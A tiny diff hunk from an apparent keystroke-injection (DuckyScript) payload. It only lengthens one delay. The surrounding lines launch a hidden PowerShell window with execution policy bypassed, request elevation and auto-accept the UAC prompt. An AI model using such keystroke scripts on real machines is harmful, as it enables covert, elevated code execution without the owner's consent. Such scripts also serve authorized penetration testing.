@@ -18,7 +18,7 @@ GUI r
 DELAY 750
 STRING powershell -NoP -NonI -W Hidden -Exec Bypass
 CTRL-SHIFT ENTER
-DELAY 1500
+DELAY 2500
 ALT y
 DELAY 5000
 
